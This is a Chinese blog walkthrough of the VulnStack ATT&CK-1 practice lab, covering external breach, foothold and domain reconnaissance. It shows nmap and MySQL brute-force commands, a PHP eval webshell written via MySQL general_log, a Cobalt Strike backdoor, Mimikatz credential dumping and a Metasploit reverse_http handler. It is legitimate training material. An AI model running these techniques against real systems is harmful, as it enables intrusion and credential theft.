<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/1655090890230.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/1655090890230.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="开坑第一个VulnStack靶场，仅供学习交流">
<meta property="og:type" content="article">
<meta property="og:title" content="ATT&amp;CK-1">
<meta property="og:url" content="http://example.com/2022/10/04/[vulnstack]ATT&CK%E6%94%BB%E5%87%BB-1/index.html">
<meta property="og:site_name" content="Security">
<meta property="og:description" content="开坑第一个VulnStack靶场，仅供学习交流">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.imgtg.com/2022/05/31/nyEGD.png">
<meta property="og:image" content="https://i.imgtg.com/2022/05/31/nvpTB.png">
<meta property="og:image" content="https://i.imgtg.com/2022/05/31/nvJZs.png">
<meta property="og:image" content="https://i.imgtg.com/2022/05/31/nv69r.png">
<meta property="og:image" content="https://i.imgtg.com/2022/05/31/nv47S.png">
<meta property="og:image" content="https://i.imgtg.com/2022/05/31/nvXUM.png">
<meta property="og:image" content="https://i.imgtg.com/2022/05/31/nvGPi.png">
<meta property="og:image" content="https://i.imgtg.com/2022/05/31/nvEzL.png">
<meta property="og:image" content="https://i.imgtg.com/2022/05/31/ny23S.png">
<meta property="og:image" content="https://i.imgtg.com/2022/05/31/nyXtC.png">
<meta property="og:image" content="https://i.imgtg.com/2022/05/31/nyu2L.png">
<meta property="og:image" content="https://i.imgtg.com/2022/05/31/ny3bi.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/01/npX4F.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/01/npCmb.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/01/npwVl.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/01/nJT4S.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/01/nJU6N.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/01/nJkmL.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/01/nJxYi.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/01/nJhAt.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/01/nJiSx.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/01/nJ7np.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/01/nJNDU.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/01/nJe6Y.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/01/nJAkv.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/n4yPD.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/n4pT6.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/n4JvP.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/n4Pdb.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/n4tOl.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/n4Cac.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/n4wer.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/nDMGM.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/n4Q9S.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/nDzGg.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/nDF3B.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/nDntK.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/nDNWS.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/nDKoL.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/nDy3t.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/nDmix.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/nDptj.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/nDJ2p.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/nDRbU.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/nDHqq.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/nDLrc.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/nDEQr.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/nDSiG.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/02/nDu6K.png">
<meta property="og:image" content="https://i.imgtg.com/2022/06/27/Nxhka.png">
<meta property="article:published_time" content="2022-10-04T14:30:39.000Z">
<meta property="article:modified_time" content="2022-10-04T15:38:37.218Z">
<meta property="article:author" content="l3ife">
<meta property="article:tag" content="内网">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.imgtg.com/2022/05/31/nyEGD.png">

<link rel="canonical" href="http://example.com/2022/10/04/[vulnstack]ATT&CK%E6%94%BB%E5%87%BB-1/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>ATT&CK-1 | Security</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Security</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签<span class="badge">2</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类<span class="badge">1</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">2</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/04/[vulnstack]ATT&CK%E6%94%BB%E5%87%BB-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="l3ife">
      <meta itemprop="description" content="谁想当安全混子呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Security">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ATT&CK-1
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-10-04 22:30:39 / 修改时间：23:38:37" itemprop="dateCreated datePublished" datetime="2022-10-04T22:30:39+08:00">2022-10-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/VulnStack%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">VulnStack靶场</span></a>
                </span>
            </span>

          
            <div class="post-description">开坑第一个VulnStack靶场，仅供学习交流</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre><code>本文章靶场采用红日靶场，模拟真实企业环境，通过练习、视频教程、博客三位一体学习，从环境搭建、漏洞利用、内网搜集、横向移动、构建通道、持久控制、痕迹清理等方式进行搭建靶场和设计题目。虚拟机所有统一密码为hongrisec@2019
</code></pre>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nyEGD"><img src="https://i.imgtg.com/2022/05/31/nyEGD.png" alt="nyEGD.png"></a></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先下载vulnstack自带的靶场环境，13g没把我吓傻<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">靶场地址</a><br>下载完之后得到三个虚拟机文件，直接在vmware打开就行。首先得配置虚拟机网络，使得能够模拟内网。网络拓扑如下：<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nvpTB"><img src="https://i.imgtg.com/2022/05/31/nvpTB.png" alt="nvpTB.png"></a><br>可以看到Win7需要设置两个网卡，内网网卡和外网网卡。Win3和Win8皆内网网卡即可。</p>
<p>总体编辑网络如下：<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nvJZs"><img src="https://i.imgtg.com/2022/05/31/nvJZs.png" alt="nvJZs.png"></a><br>1.Vm1网卡作为仅主机模式，设置为52网段。因为三台域环境虚拟机的IP初始状态被设置为固定的192.168.52.XXX&#x2F;24网段。（同时已配置好域控IP必定为192.168.52.138）</p>
<p>Win7编辑网络如下：<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nv69r"><img src="https://i.imgtg.com/2022/05/31/nv69r.png" alt="nv69r.png"></a><br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nv47S"><img src="https://i.imgtg.com/2022/05/31/nv47S.png" alt="nv47S.png"></a><br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nvXUM"><img src="https://i.imgtg.com/2022/05/31/nvXUM.png" alt="nvXUM.png"></a>    </p>
<p>Win3和Win8编辑网络如下：<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nvGPi"><img src="https://i.imgtg.com/2022/05/31/nvGPi.png" alt="nvGPi.png"></a><br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nvEzL"><img src="https://i.imgtg.com/2022/05/31/nvEzL.png" alt="nvEzL.png"></a></p>
<p>ping通情况：<br>1.内网win3和win8相互ping通，win7可以ping通外网和内网机器，内网机器则ping不通win7。<br>2.本机可以ping通win7。</p>
<table>
<thead>
<tr>
<th>主机</th>
<th>IP地址</th>
</tr>
</thead>
<tbody><tr>
<td>本机</td>
<td>192.168.123.44</td>
</tr>
<tr>
<td>win7外网服务器</td>
<td>外网IP：192.168.123.42 内网IP：192.168.52.143</td>
</tr>
<tr>
<td>Win3域成员</td>
<td>内网IP：192.168.52.141</td>
</tr>
<tr>
<td>Win8域控主机</td>
<td>内网IP：192.168.52.138</td>
</tr>
<tr>
<td>kali攻击机（MSF、CS服务器）</td>
<td>IP：192.168.123.106</td>
</tr>
</tbody></table>
<h2 id="外网突破"><a href="#外网突破" class="headerlink" title="外网突破"></a>外网突破</h2><p>要进入内网，先进行外网打点，找到目标单位的外网服务站点、主机漏洞，并获得Shell，借助外网服务器当作跳板机访问目标内网。</p>
<p>先了解基本的渗透流程</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">信息收集：目标站点的IP、域名、服务、DNS、端口、框架、数据库</span><br><span class="line"> <span class="string">|</span></span><br><span class="line">外网打点：针对不同点发现漏洞（这里最看重渗透能力）</span><br><span class="line"> <span class="string">|</span></span><br><span class="line">内网提权：寻找可以提权，如内核，命令等</span><br><span class="line"> <span class="string">|</span></span><br><span class="line">内网漫游：寻找内网主机，查看他们漏洞，找通用，CS上线（理想状态）</span><br></pre></td></tr></table></figure>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用nmap对目标IP进行端口探测</p>
<blockquote>
<p>nmap -sF -p 1-65535 192.168.123.43</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/ny23S"><img src="https://i.imgtg.com/2022/05/31/ny23S.png" alt="ny23S.png"></a><br>发现存在http、mysql服务。<br>使用nmap对目标IP</p>
<blockquote>
<p>nmap -sF -O 192.168.123.42</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nyXtC"><img src="https://i.imgtg.com/2022/05/31/nyXtC.png" alt="nyXtC.png"></a></p>
<p>查看web服务，收集到的信息如下：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php-version：<span class="number">5.4</span></span><br><span class="line">apache-version：<span class="number">2.4</span></span><br><span class="line">admin邮箱：	admin<span class="meta">@phpStudy</span>.<span class="property">net</span></span><br><span class="line">网站路径：	<span class="attr">C</span>:<span class="regexp">/phpStudy/</span><span class="variable constant_">WWW</span></span><br><span class="line">探针路径：	<span class="attr">C</span>:<span class="regexp">/phpStudy/</span><span class="variable constant_">WWW</span>/<span class="number">1.</span>php</span><br></pre></td></tr></table></figure>
<p>进行路径遍历，使用dirsearch</p>
<blockquote>
<p>python3 dirsearch.py -u “<a target="_blank" rel="noopener" href="http://192.168.123.42/&quot;">http://192.168.123.42/&quot;</a> -x 400,403,503,500</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nyu2L"><img src="https://i.imgtg.com/2022/05/31/nyu2L.png" alt="nyu2L.png"></a></p>
<p>出现phpmyadmin，查看是否可以连接mysql。</p>
<p>在看3306端口，可以使用MSF进行弱密码爆破。</p>
<h3 id="3306端口试探"><a href="#3306端口试探" class="headerlink" title="3306端口试探"></a>3306端口试探</h3><p>查看3306打开，进行弱口令爆破，打开MSF<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/ny3bi"><img src="https://i.imgtg.com/2022/05/31/ny3bi.png" alt="ny3bi.png"></a><br>使用mysql模块</p>
<blockquote>
<p>search mysql</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/npX4F"><img src="https://i.imgtg.com/2022/06/01/npX4F.png" alt="npX4F.png"></a></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use scanner<span class="regexp">/mysql/my</span>sql_login</span><br><span class="line">set USERNAME root</span><br><span class="line">set PASS_FILE <span class="regexp">/home/</span>l3ife<span class="regexp">/字典/</span>撞库列表名单.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>爆破不出来，换种思路。</p>
<h3 id="Mysql写日志shell"><a href="#Mysql写日志shell" class="headerlink" title="Mysql写日志shell"></a>Mysql写日志shell</h3><p>首先看页面，为php探针，用来探测配置，例如查看服务器参数、php模块和参数、检测某些函数能否使用和支持mysql连接正常。<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/npCmb"><img src="https://i.imgtg.com/2022/06/01/npCmb.png" alt="npCmb.png"></a><br>输入root&#x2F;root<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/npwVl"><img src="https://i.imgtg.com/2022/06/01/npwVl.png" alt="npwVl.png"></a><br>连接mysql成功</p>
<p>在前面dirsearch检测目录存在phpmyadmin，root&#x2F;root登录进去目标网站数据库。</p>
<p>phpmyadmin渗透思路：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get</span> <span class="keyword">shell</span>：</span><br><span class="line">	<span class="keyword">int</span> outfile写入webshell</span><br><span class="line">		<span class="number">1.1</span> 当前数据库用户有写权限</span><br><span class="line">		<span class="number">1.2</span> web绝对路径</span><br><span class="line">		<span class="number">1.3</span> web路径可以写入</span><br><span class="line">日志 <span class="built_in">get</span> <span class="keyword">shell</span>：</span><br><span class="line">	条件：</span><br><span class="line">		<span class="number">1</span>.读写权限+WEB绝对路径</span><br><span class="line">已知CVE攻击</span><br></pre></td></tr></table></figure>
<p>这里尝试一下，先执行SQL语句select @@basedir;查看网站物理路径<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJT4S"><img src="https://i.imgtg.com/2022/06/01/nJT4S.png" alt="nJT4S.png"></a><br>查看数据库用户是否具有写权限<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJU6N"><img src="https://i.imgtg.com/2022/06/01/nJU6N.png" alt="nJU6N.png"></a><br>secure_file_priv默认为NULL，不允许导入导出。直接get shell失败，尝试日志写shell。</p>
<p>执行命令</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>; //查看日志状态，当general_log开启，执行<span class="keyword">SQL</span>语句会存在stu1.<span class="keyword">log</span>里，修改general_log_file的值，执行<span class="keyword">SQL</span>语句就会生成对应文件，便可以执行shell。</span><br><span class="line"><span class="number">2.</span><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log=<span class="string">&#x27;on&#x27;</span>; //开启日志</span><br><span class="line"><span class="number">3.</span><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log_file=<span class="string">&#x27;C:/phpStudy/www/shell.php&#x27;</span> //指定日志写入到网站根目录下的shell.php文件</span><br><span class="line"><span class="number">4.</span><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span> //写入shell</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJkmL"><img src="https://i.imgtg.com/2022/06/01/nJkmL.png" alt="nJkmL.png"></a><br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJxYi"><img src="https://i.imgtg.com/2022/06/01/nJxYi.png" alt="nJxYi.png"></a></p>
<p>写入shell，直接访问该shell就行。<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJhAt"><img src="https://i.imgtg.com/2022/06/01/nJhAt.png" alt="nJhAt.png"></a><br>进行蚁剑连接。<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJiSx"><img src="https://i.imgtg.com/2022/06/01/nJiSx.png" alt="nJiSx.png"></a></p>
<hr>
<p>这里拿yxcms后台上传shell也可以。<br>网站给了后台地址&#x2F;index.php?r&#x3D;admin &#x2F; 账号密码为admin&#x2F;123456<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJ7np"><img src="https://i.imgtg.com/2022/06/01/nJ7np.png" alt="nJ7np.png"></a><br>cms后台系列，可以找模板编辑，找到“前台编辑”功能，编辑文件：<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJNDU"><img src="https://i.imgtg.com/2022/06/01/nJNDU.png" alt="nJNDU.png"></a><br>需要找到木马上传到哪个位置，通过找到源码发现生成在&#x2F;yxcms&#x2F;protected&#x2F;apps&#x2F;default&#x2F;view&#x2F;default&#x2F;路径（遍历目录存在beifen.rar源码）<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJe6Y"><img src="https://i.imgtg.com/2022/06/01/nJe6Y.png" alt="nJe6Y.png"></a><br>蚁剑连接<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJAkv"><img src="https://i.imgtg.com/2022/06/01/nJAkv.png" alt="nJAkv.png"></a><br>自此外网边界突破已成功，重点来学习内网知识。</p>
<h2 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h2><p>目的是通过win7外网服务器主机的控制权，横向渗透内网，拿下域控。首先进行内网信息收集，摸清内网域组成和网络拓扑。</p>
<h3 id="CS-Backdoor上线"><a href="#CS-Backdoor上线" class="headerlink" title="CS Backdoor上线"></a>CS Backdoor上线</h3><p>拿下服务器权限要植入Backdoor，可以尝试MSF或者CS。这里使用CS。</p>
<p>使用kali运行CS服务,先下载CS并放到kali上，切换到CS目录</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver kali的<span class="built_in">IP</span>  密码 <span class="comment">//启动CS</span></span><br></pre></td></tr></table></figure>
<p>本机开启客户端，连接kali<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4yPD"><img src="https://i.imgtg.com/2022/06/02/n4yPD.png" alt="n4yPD.png"></a><br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4pT6"><img src="https://i.imgtg.com/2022/06/02/n4pT6.png" alt="n4pT6.png"></a><br>生成exe可执行Backdoor程序<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4JvP"><img src="https://i.imgtg.com/2022/06/02/n4JvP.png" alt="n4JvP.png"></a><br>把exe通过蚁剑放到win7的网站目录下<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4Pdb"><img src="https://i.imgtg.com/2022/06/02/n4Pdb.png" alt="n4Pdb.png"></a><br>蚁剑运行exe文件，CS靶机上线<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4tOl"><img src="https://i.imgtg.com/2022/06/02/n4tOl.png" alt="n4tOl.png"></a></p>
<p>使用提权功能，提权为system权限<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4Cac"><img src="https://i.imgtg.com/2022/06/02/n4Cac.png" alt="n4Cac.png"></a><br>使用Mimikatz抓取本机用户密码（注意的是，mimikatz需要过杀软，而需要的免杀又是另一个研究方向了）<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4wer"><img src="https://i.imgtg.com/2022/06/02/n4wer.png" alt="n4wer.png"></a><br>在View里的credentials里可以看到hashdump与mimikatz获取的数据<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDMGM"><img src="https://i.imgtg.com/2022/06/02/nDMGM.png" alt="nDMGM.png"></a><br>win7的登录密码出来了。</p>
<h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><p>进入beacon，通过shell+命令进行收集信息。查询域控以及域内的其他主机，附上部分内网信息收集的命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">net view                 <span class="comment"># 查看局域网内其他主机名</span></span><br><span class="line">net config Workstation   <span class="comment"># 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span></span><br><span class="line">net user                 <span class="comment"># 查看本机用户列表</span></span><br><span class="line">net user /domain         <span class="comment"># 查看域用户</span></span><br><span class="line">net localgroup administrators <span class="comment"># 查看本地管理员组（通常会有域用户）</span></span><br><span class="line">net view /domain         <span class="comment"># 查看有几个域</span></span><br><span class="line">net user 用户名 /domain   <span class="comment"># 获取指定域用户的信息</span></span><br><span class="line">net group /domain        <span class="comment"># 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span></span><br><span class="line">net group 组名 /domain    <span class="comment"># 查看域中某工作组</span></span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain  <span class="comment"># 查看域管理员的名字</span></span><br><span class="line">net group <span class="string">&quot;domain computers&quot;</span> /domain  <span class="comment"># 查看域中的其他主机名</span></span><br><span class="line">net group <span class="string">&quot;doamin controllers&quot;</span> /domain  <span class="comment"># 查看域控制器主机名（可能有多台）</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.判断是否存在域，</p>
<blockquote>
<p>net config workstation &#x2F;&#x2F;查看本机的计算机名、用户名、系统版本、工作站、域、登录域的全面信息</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4Q9S"><img src="https://i.imgtg.com/2022/06/02/n4Q9S.png" alt="n4Q9S.png"></a></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">判断域：</span><br><span class="line">	<span class="number">1</span><span class="selector-class">.ipconfig</span> \<span class="attribute">all</span></span><br><span class="line">	<span class="number">2</span><span class="selector-class">.systeminfo</span></span><br><span class="line">	<span class="number">3</span><span class="selector-class">.net</span> <span class="selector-tag">time</span> /domain </span><br><span class="line">		<span class="number">1</span>.存在域，当前用户不是域用户</span><br><span class="line">		<span class="number">2</span>.存在域，当前用户是域用户</span><br><span class="line">		<span class="number">3</span>.不存在域</span><br><span class="line">	<span class="number">4</span><span class="selector-class">.shell</span> net view /domain <span class="comment">//查看当前域</span></span><br></pre></td></tr></table></figure>
<p>2.查看有几个域</p>
<blockquote>
<p>net view &#x2F;domain</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDzGg"><img src="https://i.imgtg.com/2022/06/02/nDzGg.png" alt="nDzGg.png"></a><br>DNS服务器名为god.org,当前登录域为GOD，只存在一个域。</p>
<p>3.查看域控制器的主机用户名,确认域控主机</p>
<blockquote>
<p>net group “domain controllers” &#x2F;domain</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDF3B"><img src="https://i.imgtg.com/2022/06/02/nDF3B.png" alt="nDF3B.png"></a><br>发现域控主机名为OWA</p>
<p>4.查询域内的存活主机信息,得知域控主机的IP为192.168.52.138，为win8域控主机。</p>
<blockquote>
<p>net view</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDntK"><img src="https://i.imgtg.com/2022/06/02/nDntK.png" alt="nDntK.png"></a></p>
<p>5.发现局域网还存在另一台主机（名称为ROOT-TVI862UBEH），确认该主机是否存在域内。查看域中的其他主机名。</p>
<blockquote>
<p>shell net group “domain computers” &#x2F;domain</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDNWS"><img src="https://i.imgtg.com/2022/06/02/nDNWS.png" alt="nDNWS.png"></a></p>
<p>确认域控主机为192.168.52.138,存在另一台域成员192.168.52.141（Win3），接下来就是进行横向渗透拿下域控。</p>
<h2 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h2><p>通过WIn7跳板机，横向渗透拿下内网域内的域成员和域控主机。内网主机漏洞多存在于系统老旧，未打补丁。</p>
<h3 id="CS派生会话给MSF"><a href="#CS派生会话给MSF" class="headerlink" title="CS派生会话给MSF"></a>CS派生会话给MSF</h3><p>1.在kali进行MSF监听</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_http</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lhost 192.168.123.106</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lport 6666</span></span><br><span class="line">exploit </span><br><span class="line"></span><br></pre></td></tr></table></figure>
